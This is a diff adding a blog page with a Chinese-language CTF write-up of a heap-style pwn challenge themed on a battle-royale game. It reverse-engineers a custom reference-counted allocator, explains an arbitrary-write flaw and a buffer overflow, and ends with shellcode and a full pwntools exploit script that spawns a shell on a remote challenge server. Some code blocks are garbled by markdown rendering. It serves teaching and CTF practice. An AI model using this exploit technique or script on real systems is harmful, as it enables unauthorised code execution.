@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>20171007</title>
+  <meta name="description" content="前言这题真难啊，折腾我好久，我都把整个游戏逆出来了，结果最后发现根本不用全部逆出来，哈哈。。不过没事，当作练习逆向了。。哈哈。。。">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/20171007.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">20171007</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id=">前言</h1>
+
+<p>这题真难啊，折腾我好久，我都把整个游戏逆出来了，结果最后发现根本不用全部逆出来，哈哈。。不过没事，当作练习逆向了。。哈哈。。。</p>
+
+<h1 id=">本题考点</h1>
+
+<p>这道题我是没找到什么经典的缓冲区溢出啊格式化字符串啊double free啊UAF啊之类的洞。。。感觉我用的方法挺奇葩的。。。嗯。。。不知道跟大家用的方法一不一样。。。好了不废话了开始分析。。。</p>
+
+<h1 id=">逆向部分</h1>
+
+<p>大概呢，就是作者自己mmap了一片内存，然后自己设计了一个chunk结构，然后申请内存空间都从这片mmap出来的内存申请。这个chunk结构的header有16字节，第二个一看就知道是chunk_size不说，关键是第一个，我一开始硬是没看出来这个QWORD是啥。。。<br>
+```c<br>
+<em>QWORD *</em>_fastcall malloc_adjust(signed int a1)<br>
+{<br>
+  signed int v2; // [sp+Ch] [bp-4h]@3</p>
+
+<p>if ( a1 &gt;= 0 &amp;&amp; a1 &gt; 16 )                     // &gt;16<br>
+  {<br>
+    if ( a1 &lt;= 16 || a1 &gt; 48 )                  // &gt;48<br>
+    {<br>
+      if ( a1 &lt;= 48 || a1 &gt; 80 )                // &gt;80<br>
+        v2 = 400;                               // 80<x<br>
+      else<br>
+        v2 = 80;                                // 48<x<=80<br>
+    }<br>
+    else<br>
+    {<br>
+      v2 = 48;                                  // 16<size<=48<br>
+    }<br>
+  }<br>
+  else<br>
+  {<br>
+    v2 = 16;                                    // x<=16<br>
+  }<br>
+  return malloc_(v2);<br>
+}//这个malloc_adjust会根据输入调整一下实际分配的大小，就当他是对齐用的吧。。。<br>
+```<br>
+然后我们来看看game_start函数的部分代码(输入2 signup时)<br>
+```c<br>
+if ( v3 == 2 )<br>
+{<br>
+    puts("welcome to Playerunknown's Battlegrounds");<br>
+    puts("First,you need set your username and password");<br>
+    v1 = malloc_adjust(48);<br>
+    dreflhs_rhs_withGC((_QWORD **)&sign_infor, v1);// collapse<br>
+    puts("input your username");<br>
+    getstr(sign_infor->username, 0x10LL);<br>
+    puts(&quot;input your password&quot;);<br>
+    getstr(sign_infor-&gt;password, 0x10LL);<br>
+    puts(&quot;Second,you need create a character and give him a name&quot;);<br>
+    v2 = malloc_adjust(56);<br>
+    dreflhs_rhs_withGC((<em>QWORD **)&amp;sign_infor-&gt;status, v2);<br>
+    sign_infor-&gt;status-&gt;health = 100LL;<br>
+    sign_infor-&gt;status-&gt;capacity = 100LL;<br>
+    sign_infor-&gt;status-&gt;stamina = 100LL;<br>
+    puts(&quot;input your character&#39;s name&quot;);<br>
+    getstr(sign_infor-&gt;status-&gt;name, 0x10LL);<br>
+    puts(&quot;all is ok&quot;);<br>
+}<br>
+<code class="prettyprint"><br>
+v1 malloc 之后，会调用一个叫做dreflhs_rhs_withGC的函数，这个函数我前面一直没看懂，硬是盯了好久，才发现这其实是 带GC的 \*参数1=参数2 的这么一个操作，所以chunk的第一个QWORD是一个类似引用计数的东西，我们跟进这个函数看看<br>
+</code>c<br>
+// *lhs=rhs<br>
+_QWORD *</em><em>fastcall dreflhs_rhs_withGC(_QWORD **pointer, void *mem_frommymalloc)<br>
+{<br>
+  _QWORD *chunk</em>mem; // rax@2<br>
+  _QWORD *chunk; // rax@4<br>
+  _QWORD *result; // rax@5</p>
+
+<p>if ( mem_frommymalloc )<br>
+  {<br>
+    chunk_mem = minus_16(mem_frommymalloc);<br>
+    incre_ref(chunk_mem);<br>
+  }<br>
+  if ( *pointer )<br>
+  {<br>
+    chunk = minus_16(*pointer);<br>
+    reduce_ref(chunk);                          // collapse<br>
+  }<br>
+  result = pointer;<br>
+  *pointer = mem_frommymalloc;<br>
+  return result;<br>
+}<br>
+<strong>int64 __fastcall is_deref_a_inrange(_QWORD *a1)<br>
+{<br>
+  return *a1 &lt;= 0x7FFFFFFFEFFFLL &amp;&amp; *a1 &gt; 0x400000LL;<br>
+}<br>
+_DWORD *</strong>fastcall ret_addr_of_first_addr(<em>QWORD *chunk, signed __int64 *pi)<br>
+{<br>
+  signed __int64 i; // [sp+18h] [bp-18h]@3<br>
+  signed _</em>int64 size; // [sp+20h] [bp-10h]@3<br>
+  _QWORD *mem; // [sp+28h] [bp-8h]@3</p>
+
+<p>if ( !chunk )<br>
+    exit(0);<br>
+  mem = chunk + 2;<br>
+  size = (chunk[1] - 16LL) / 8;<br>
+  for ( i = *pi; i &lt; size; ++i )<br>
+  {<br>
+    *pi = i;<br>
+    if ( (unsigned __int8)is_deref_a_inrange(&amp;mem[i]) )<br>
+      return &amp;mem[i];<br>
+  }<br>
+  return 0LL;<br>
+}</p>
+
+<p>// also, reflect mem to chunk<a href="data%20part">2</a><br>
+<em>QWORD *</em>_fastcall rec_chunk(_QWORD *chunk)<br>
+{<br>
+  _QWORD *result; // rax@3</p>
+
+<p>if ( !mem )<br>
+    mem = malloc_adjust(4);<br>
+  chunk[2] = mem;//任意chunk[2]可以被我们控制，会被赋值为mem的值，QWORD SHOOT here!!!<br>
+  <em>mem = chunk;                        // 可能overflow，但我没用这个<br>
+  result = mem + 1;<br>
+  ++mem;<br>
+  return result;<br>
+}<br>
+_<em>int64 _<em>fastcall reduce_ref(<em>QWORD *chunk)<br>
+{<br>
+  _QWORD *chunk</em>1; // rax@3<br>
+  _</em>int64 i; // [sp+10h] [bp-20h]@1<br>
+  _QWORD *chunk</em>; // [sp+18h] [bp-18h]@1<br>
+  _QWORD *</em>p_elem; // [sp+20h] [bp-10h]@2<br>
+  __int64 v6; // [sp+28h] [bp-8h]@1</p>
+
+<p>v6 = <em>MK_FP(<strong>FS</strong>, 40LL);<br>
+  i = 0LL;<br>
+  chunk_ = chunk;<br>
+  --*chunk;<br>
+  if ( !*chunk_ )                               // 如果引用计数变成0<br>
+  {<br>
+    while ( 1 )<br>
+    {<br>
+      p_elem = (_QWORD *</em>)ret_addr_of_first_addr(chunk, &amp;i);<br>
+      if ( p_elem == 0LL )                      // 如果在chunk中已经没有有效地址了<br>
+        break;<br>
+      ++i;                                      // 增加i并且做下次循环<br>
+      chunk_1 = minus_16(*p_elem);              // 如果 *pmem 是有效地址(在指定范围中)，但不一定是在mmap的堆中, 也会把它当作mmap中的chunk，进行rec_chunk的调用<br>
+      rec_chunk(chunk_1);                       // 它被当成了chunk，但不一定是mmap中的chunk(0x41414141-16)<br>
+    }<br>
+    rec_chunk(chunk_);<br>
+  }<br>
+  return *MK_FP(<strong>FS</strong>, 40LL) ^ v6;<br>
+}<br>
+<code class="prettyprint"><br>
+这个代码讲起来有些复杂，总之大概就是\*a1=a2，并且增加a2的计数，减少a1的计数，如果a1的计数变成0了，就以QWORD为单位遍历缓冲区里面的数，如果碰到在规定范围内的(\*a1 &lt;= 0x7FFFFFFFEFFFLL &amp;&amp; *a1 &gt; 0x400000LL)，就对其进行处理，如rec_chunk函数所示。然而在这个范围内不一定是mmap中的地址，所以导致一个QWORD SHOOT，但是写入的数据只能是mem的值。<br>
+喔，还有就是我逆出来的结构体，供大家参考<br>
+</code>asm<br>
+00000000 sign_info       struc ; (sizeof=0x30, mappedto_1)<br>
+00000000 unknown         dq ?<br>
+00000008 username        db 16 dup(?)<br>
+00000018 password        db 16 dup(?)<br>
+00000028 status          dq ?                    ; offset<br>
+00000030 sign_info       ends<br>
+00000030<br>
+00000000 ; ---------------------------------------------------------------------------<br>
+00000000<br>
+00000000 char_status     struc ; (sizeof=0x38, mappedto_4)<br>
+00000000 name            db 8 dup(?)<br>
+00000008 unknown         dq ?<br>
+00000010 health          dq ?<br>
+00000018 stamina         dq ?<br>
+00000020 capacity        dq ?<br>
+00000028 location_       dq ?<br>
+00000030 item_ll         dq ?                    ; offset<br>
+00000038 char_status     ends<br>
+00000038<br>
+00000000 ; ---------------------------------------------------------------------------<br>
+00000000<br>
+00000000 item            struc ; (sizeof=0x28, mappedto_5)<br>
+00000000 item_type       dq ?<br>
+00000008 weight          dq ?<br>
+00000010 num             dq ?<br>
+00000018 next            dq ?                    ; offset<br>
+00000020 some_num        dq ?<br>
+00000028 item            ends<br>
+00000028<br>
+```</p>
+
+<h1 id=">漏洞触发</h1>
+
+<p>所以什么时候会触发呢？就是sign第二次的时候，具体逻辑不说了。总之，如果前一个username转换成QWORD值时在范围内（*a1 &lt;= 0x7FFFFFFFEFFFLL &amp;&amp; *a1 &gt; 0x400000LL）时，第二次sign就会导致[username]=mem。。。</p>
+
+<h1 id=">漏洞利用</h1>
+
+<p>所以怎么利用呢？好的，[任意地址]=mem，而且mem还会自增，还会有其他有效地址被存入mem！(所以有可能破坏mem中的shellcode) 这咋一看没什么用啊！我这种菜鸟，就卡在这想了好久！<br>
+最后根据我的不断实验，得出exploit方法:<br>
+1. sign第一次 cheat_buf = mem<br>
+2. sign第二次 _exit GOT表 = mem, 这时前一个QWORD SHOOT执行<br>
+3. sign第三次 username 为1，这时前一个QWORD SHOOT执行，GOT表被修改<br>
+4. (PS:上面三个sign password和character&#39;s name都是1)<br>
+5. 执行cheat，修改cheat里面的内存，其实这就是mem里面的内存！放置payload<br>
+6. 调用_exit，getshell!</p>
+
+<p>注：<br>
+1. _exit是我不断推敲得出来的，覆盖其他(getchar puts)的话，根本到不了放payload的cheat那里，因为这两个函数调用太频繁<br>
+2. 然后很尴尬的是，程序没有_exit的调用(主函数)，所以找_exit的xref，发现唯一可能让他调用的是这里。。。<br>
+```c<br>
+int show_location()<br>
+{<br>
+  int result; // eax@2</p>
+
+<p>switch ( sign_infor-&gt;status-&gt;location_ )<br>
+  {<br>
+    case 0LL:<br>
+      result = puts(&quot;Your in a random location&quot;);<br>
+      break;<br>
+    case 1LL:<br>
+      result = puts(&quot;Your in the Sosnovka military base&quot;);<br>
+      break;<br>
+    case 2LL:<br>
+      result = puts(&quot;Your in the Sosnovka military base&quot;);<br>
+      break;<br>
+    case 3LL:<br>
+      result = puts(&quot;Your in the Georgopol&quot;);<br>
+      break;<br>
+    case 4LL:<br>
+      result = puts(&quot;Your in the Novorepnoye&quot;);<br>
+      break;<br>
+    case 5LL:<br>
+      result = puts(&quot;Your in the Mylta Power&quot;);<br>
+      break;<br>
+    case 6LL:<br>
+      result = puts(&quot;Your in the Primorsk&quot;);<br>
+      break;<br>
+    default:<br>
+      puts(&quot;location error&quot;);<br>
+      exit(0);<br>
+      return result;<br>
+  }<br>
+  return result;<br>
+}<br>
+<code class="prettyprint"><br>
+所以找个方法，把sign\_infor-&gt;status-&gt;location_给污染了，就ok，实际上，如果动态跟一下的话，发现这个status就在cheat_buf的后面，而cheat有明显的溢出漏洞<br>
+</code>c<br>
+void cheat()<br>
+{<br>
+  if ( cheat_buf )<br>
+  {<br>
+    puts(&quot;content:&quot;);<br>
+    getstr((char <em>)(cheat_buf + 16), 300LL);//overflow!!<br>
+  }<br>
+  else<br>
+  {<br>
+    cheat_buf = (__int64)malloc_adjust(48);<br>
+    puts(&quot;name:&quot;);<br>
+    getstr((char *)cheat_buf, 16LL);<br>
+    puts(&quot;content:&quot;);<br>
+    getstr((char *)(cheat_buf + 16), 32LL);<br>
+  }<br>
+}<br>
+<code class="prettyprint"><br>
+300，够影响到status了，事实上，如果动态跟的话，我们会发现status的地址就在cheat_buf+0x98处（如果按照我都步骤做的话）。。。<br>
+然后就是构造payload了。。。<br>
+</code>python<br>
+paddings = 0x98<br>
+shellcode = &quot;\x48\x8b\x1c\x25\x70\x50\x60\x00\x48\x81\xeb\xa0\xed\x03\x00\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xff\xd3\x90\x90\x90&quot;<br>
+payload = &#39;A&#39;</em>8 + shellcode + &#39;A&#39; * (paddings - 8 - len(shellcode)) + p64(0x605098)<br>
+```<br>
+前面8个&#39;A&#39;是因为_exit的实际会跳转到cheat_buf+8处执行，动态跟一下就知道了，然后说说最后的那个0x605098，反正只要满载p-&gt;location不在范围内就好，我随便找的一个.data的地址，这个好像是mmap_initial?不记得了，哪个都一样。。。<br>
+shellcode基本上就是获取malloc函数地址，计算system地址，push (QWORD)&quot;/bin/sh\x00&quot;(刚好是8字节，哈哈)，mov rdi,rsp, call system (伪代码，伪代码，请勿当真)<br>
+所以最后exp</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">g_local</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./pwn"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"123.206.22.95"</span><span class="p">,</span><span class="mi">8888</span><span class="p">)</span>
+
+<span class="c">#pre: in the initial begin status</span>
+<span class="c">#post: same as above</span>
+<span class="k">def</span> <span class="nf">signup</span><span class="p">(</span><span class="n">szUsername</span><span class="p">,</span> <span class="n">szPassword</span><span class="p">,</span> <span class="n">szCharname</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">sh</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"input your username</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">szUsername</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"input your password</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">szPassword</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"input your character's name</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">szCharname</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"2.Signup</span><span class="se">\n</span><span class="s">==============================</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c">#pre: in the initial begin status, usernamepasword correct</span>
+<span class="c">#post: game begin status</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">szUsername</span><span class="p">,</span> <span class="n">szPassword</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">sh</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input your username:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">szUsername</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input your password:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">szPassword</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0.exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c">#pre: game begin status</span>
+<span class="c">#post: wo shuo shell ni xin bu?</span>
+<span class="k">def</span> <span class="nf">cheat_set_payload</span><span class="p">(</span><span class="n">szPayload</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">sh</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"5</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"content:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">szPayload</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">signup</span><span class="p">(</span><span class="s">"</span><span class="se">\xf0\x50\x60</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+<span class="n">signup</span><span class="p">(</span><span class="s">"</span><span class="se">\x80\x50\x60</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+<span class="n">signup</span><span class="p">(</span><span class="s">"1"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+<span class="n">login</span><span class="p">(</span><span class="s">"1"</span><span class="p">,</span><span class="s">"1"</span><span class="p">)</span>
+
+<span class="n">paddings</span> <span class="o">=</span> <span class="mh">0x98</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x8b\x1c\x25\x70\x50\x60\x00\x48\x81\xeb\xa0\xed\x03\x00\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xff\xd3\x90\x90\x90</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="n">paddings</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x605098</span><span class="p">)</span>
+
+<span class="n">cheat_set_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
